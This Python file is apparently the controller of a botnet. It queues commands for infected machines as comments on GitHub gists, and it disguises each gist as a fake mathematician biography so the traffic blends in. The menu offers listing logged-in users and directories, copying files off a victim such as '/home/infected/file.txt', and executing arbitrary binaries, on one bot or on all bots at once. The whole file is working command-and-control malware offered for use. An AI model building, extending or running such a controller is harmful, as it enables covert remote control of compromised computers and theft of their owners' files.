from tabulate import tabulate
from api_wrapper import get_gist_id_from_description, create_comment, create_gist
from alive import get_bots
from termcolor import colored
import os
import re
import random
import steganography


def command_processor(command, bot):
    # Bot names are generated authomatically in same format as docker containers (john_doe)
    humanized_name = bot["name"].replace("_", " ").title()
    gist_id = get_gist_id_from_description(humanized_name) or None

    # If the gist doesn't exist (we have never sent a command to this bot), create it
    # We will disguise it as a biography of a mathematician
    if not gist_id:
        name, surname = humanized_name.split(" ")

        random_biography = random.choice(steganography.mathematicians) \
            .replace("SURNAME", surname) \
            .replace("NAME", name)

        create_gist(humanized_name, random_biography)
        gist_id = get_gist_id_from_description(humanized_name)

    # Pending commands have the ⏱️ emoji in front of them, which turns into a ✅ when the bot processes it
    status_code = create_comment(gist_id, f"⏱️ {command}")
    return status_code


def send_commands(bot, broadcast=False):
    os.system("clear")

    if broadcast:
        print(
            colored('\nBe careful! You are sending a command to ALL BOTS!\n', attrs=['bold']))
    else:
        print("\nSend a command to " +
              bot["name"] + " (" + bot["mac"] + "):\n")

    print(tabulate([['w', 'List of users currently logged in', 'w'],
                    ['ls <PATH>', 'List content of specified directory', 'ls /home'],
                    ['id', 'If of current user', 'id'],
                    ['cp "<REMOTE_ROUTE>"', 'Copy a file from the bot to the controller. The file name is specified',
                        'cp "/home/infected/file.txt"'],
                    ['exec <BINARY_ROUTE>',
                        'Execute a binary inside the bot given the name of the binary', 'exec /usr/bin/ps']
                    ],
                   headers=['Command', 'Description', 'Example']))

    command = input("\nWrite a command: ").strip()

    while not any(re.match(s, command) for s in [r"^w$", r"^ls *", r"^id$", r"^cp \"[^\"]*\"$", r"exec *"]):
        command = input("\nInvalid command. Try again: ")

    print("\nSending command to bot(s)...\n")

    bots = [bot] if not broadcast else get_bots()
    for bot in bots:
        status_code, reason = command_processor(command, bot)
        if status_code == 201:
            print(
                colored(f"[{status_code} {reason}] Command sent to {bot['name']}", "green"))
        else:
            print(colored(
                f"[{status_code} {reason}] Error sending command to {bot['name']}", "red"))

    try:
        input(
            "\nPress enter to send more commands. Press Ctrl+C to go back to the main menu.")
        send_commands(bot, broadcast=broadcast)
    except KeyboardInterrupt:
        return
